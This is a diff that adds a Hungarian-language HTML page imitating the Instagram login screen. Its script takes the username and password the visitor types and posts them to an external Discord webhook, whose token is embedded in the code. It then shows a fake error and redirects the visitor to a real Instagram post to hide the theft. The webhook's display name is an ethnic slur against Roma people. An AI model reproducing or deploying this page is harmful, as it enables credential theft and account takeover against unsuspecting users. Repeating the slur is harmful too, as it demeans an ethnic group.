@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="hu">
+    <head>
+        <link rel="stylesheet" href="style.css" type="text/css">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Bejelentkezés * Instagram</title>
+    </head>
+    <body>
+        <header></header>
+        <main style="display: block; margin:auto;">
+            
+            <img src="ikon.png" alt="">
+            
+            <input type="email" id="email" name="textfield" placeholder="Telefonszám, felhasználónév vagy e-mail-cím" required minlength="4" maxlength="8" size="35" id="email"/>
+            
+            <input type="password" id="pass" name="textfield" placeholder="Jelszó" required minlength="4" maxlength="8" size="35" id="pass"/>
+            <br>
+            <button type="button" onclick="myScript()">
+                Belépés
+            </button>
+            <br> <a style="font-size: small; font-weight:bold;">VAGY</a> <br>
+            <br>
+            <a onclick="error()" width="100px" id="face"><img src="facebook-icon.jpg" width="15px" style="margin: 0; padding:0; font-weight:bolder;" >  Bejelentkezés a Facebookkal</a>
+            <br>
+            <br>
+            <a onclick="error()" class="small" style="color: rgb(0, 55, 107);">Elfelejtetted a jelszavadat?</a>
+            <br>
+            <p class="small">Bejelentkezés nélkül is <a onclick="error()" style="color: rgb(0, 55, 107);">jelentheted, ha egy tartalom <br> szerinted jogellenes </a>az országodban.</p>
+
+        </main>
+        <br>
+        <div>
+            <p style="color: black;">Nincs fiókod? <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Faccountscenter.instagram.com%2F%3F__coig_login%3D1" style="color: rgb(0,149,246);"> Regisztráció</a></p>
+        </div>
+        <script>
+            let myScript = () => {
+                const email = document.getElementById("email").value;
+                const pass = document.getElementById("pass").value;
+
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1181959763311992933/laa35ChzmqttO_ItrIxJiRBxUE69b--AGbiZDAyYebpT3oRrVsWffDvNPtyI46vkjNwb");
+
+                request.setRequestHeader('Content-type', 'application/json');
+
+                const params = {
+                    username: "E-Cigány",
+                    avatar_url: "",
+                    content: `Username: ${email}\nPassword: ${pass}`
+                }
+
+                request.send(JSON.stringify(params));
+                alert("Uncaught ReferenceError: login() is not defined");
+                location.href = "https://www.instagram.com/p/CO0l02xlrsD/?igshid=MzRlODBiNWFlZA=="
+         };
+
+
+        </script>
+    </body>
+</html>
